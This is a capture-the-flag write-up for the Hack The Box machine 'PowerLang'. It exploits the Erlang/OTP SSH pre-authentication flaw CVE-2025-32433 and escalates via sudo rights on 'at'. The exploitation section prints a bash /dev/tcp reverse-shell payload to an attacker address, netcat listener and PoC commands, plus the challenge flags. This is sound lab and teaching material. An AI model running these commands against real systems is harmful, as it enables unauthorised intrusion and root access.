# PowerLang - CTF Write-Up

## Challenge Overview

**Challenge Name:** PowerLang  
**Category:** Fullpwn  
**Difficulty:** very easy  

**Flags:**
- User Flag: `HTB{erlang_ssh_is_4_th1ng?}`
- Root Flag: `HTB{4_t1m3ly_sud0_rul3}`

## Summary

This challenge involves exploiting CVE-2025-32433, a critical vulnerability in Erlang/OTP SSH implementation that allows pre-authentication remote code execution. After gaining initial access as `it-operator`, privilege escalation is achieved through sudo permissions on the `at` command.

## Reconnaissance

### Port Scanning
```bash
nmap -sC -sV -p- 10.129.212.153
```

**Results:**
- Port 53: DNS
- Port 80: HTTP (powerlang.htb)
- Port 2222: SSH (Erlang/5.2.9)

### Service Enumeration

#### HTTP Service (Port 80)
- Add `10.129.212.153 powerlang.htb` to `/etc/hosts`
- Website appears to be a React/Vite application
- No obvious vulnerabilities found in web application

#### SSH Service (Port 2222)
```bash
nc 10.129.212.153 2222
```
**Banner:** `SSH-2.0-Erlang/5.2.9`

This version is vulnerable to **CVE-2025-32433**.

## Vulnerability Analysis

### CVE-2025-32433 - Erlang/OTP SSH Pre-Authentication RCE

**Affected Versions:**
- OTP-27.3.2 and earlier
- OTP-26.2.5.10 and earlier  
- OTP-25.3.2.19 and earlier

**Technical Details:**
- SSH message numbers 80+ are reserved for post-authentication
- Vulnerable servers don't enforce this restriction
- Allows pre-authentication command execution
- Commands must be written in Erlang syntax with trailing `.`

## Exploitation

### Step 1: Download and Setup Exploit

Clone the proven working exploit repository by omer-efe-curkus:
```bash
git clone https://github.com/omer-efe-curkus/CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC.git
cd CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC
```

**Note:** This specific PoC was chosen because it successfully implements the reverse shell functionality using the `/dev/tcp/` method in bash, which provides a reliable interactive connection.

### Step 2: Test Vulnerability
```bash
python3 cve-2025-32433.py 10.129.212.153 -p 2222 --check
```

### Step 3: Gain Initial Access

Start a netcat listener:
```bash
nc -lvp 4444
```

Execute the exploit to get a reverse shell:
```bash
python3 cve-2025-32433.py 10.129.212.153 -p 2222 --shell --lhost 10.10.14.29 --lport 4444
```

**Payload used:** `os:cmd("bash -c 'exec 5<>/dev/tcp/10.10.14.29/4444; cat <&5 | while read line; do $line 2>&5 >&5; done'").`

### Step 4: Shell Upgrade

Once you receive the connection, upgrade to a proper TTY:
```bash
script /dev/null -c bash
```

### Step 5: User Flag

The user flag is located in the home directory:
```bash
whoami  # it-operator
cat /home/it-operator/user.txt
```
**User Flag:** `HTB{erlang_ssh_is_4_th1ng?}`

## Privilege Escalation

### Step 1: Check Sudo Privileges
```bash
sudo -l
```

**Output:**
```
User it-operator may run the following commands on powerlang:
    (ALL) NOPASSWD: /usr/bin/at
```

### Step 2: Enumerate Root Directory

Use the `at` command to list contents of `/root` as root:
```bash
echo "ls -la /root > /tmp/root_listing.txt && chmod 644 /tmp/root_listing.txt" | sudo at now
```

Wait a few seconds, then check:
```bash
cat /tmp/root_listing.txt
```

**Results:**
```
total 32
drwx------  5 root root 4096 Apr 30 14:05 .
drwxr-xr-x 23 root root 4096 Apr 30 14:05 ..
lrwxrwxrwx  1 root root    9 Mar 31 17:22 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr 22  2024 .bashrc
drwx------  2 root root 4096 Apr 30 14:05 .cache
drwxr-xr-x  3 root root 4096 Apr 30 14:05 .local
-rw-r--r--  1 root root  161 Apr 22  2024 .profile
-rw-r-----  1 root root   24 Apr 29 16:49 root.txt
drwx------  2 root root 4096 Apr 30 14:05 .ssh
```

### Step 3: Extract Root Flag

Use `at` to copy the root flag to a readable location:
```bash
echo "cp /root/root.txt /tmp/root_flag.txt && chmod 644 /tmp/root_flag.txt" | sudo at now
```

Wait a few seconds, then read the flag:
```bash
cat /tmp/root_flag.txt
```
**Root Flag:** `HTB{4_t1m3ly_sud0_rul3}`

## Technical Concepts

1. **CVE-2025-32433:** Pre-authentication RCE in Erlang SSH servers
2. **Erlang Command Syntax:** Commands must end with `.` (e.g., `os:cmd("command").`)
3. **SSH Protocol:** Message numbers 80+ should be post-authentication only
4. **Privilege Escalation:** `at` command can schedule tasks to run as root

## Security Lessons

1. **Version Management:** Keep SSH implementations updated
2. **Sudo Configuration:** Be cautious with NOPASSWD rules for scheduling commands
3. **Network Segmentation:** Limit exposure of vulnerable services
4. **Monitoring:** Watch for unusual SSH connection patterns

## Tools Used

- **nmap:** Port scanning and service enumeration
- **[CVE-2025-32433 PoC by omer-efe-curkus](https://github.com/omer-efe-curkus/CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC):** Remote code execution exploit
- **netcat:** Reverse shell listener
- **at command:** Privilege escalation via job scheduling

## Mitigation Recommendations

1. **Update Erlang/OTP:** Upgrade to version 5.2.10 or later
2. **Firewall Rules:** Restrict access to SSH services
3. **Sudo Hardening:** Review and restrict sudo permissions
4. **Monitoring:** Implement SSH connection logging and anomaly detection

## Timeline

1. **Reconnaissance:** 5-10 minutes
2. **Vulnerability Identification:** 2-3 minutes  
3. **Initial Exploitation:** 5-10 minutes
4. **Privilege Escalation:** 10-15 minutes
5. **Flag Extraction:** 2-3 minutes

**Total Time:** ~30-40 minutes

## Write-Up Credit: [binchickens69](https://ctf.hackthebox.com/user/profile/605069)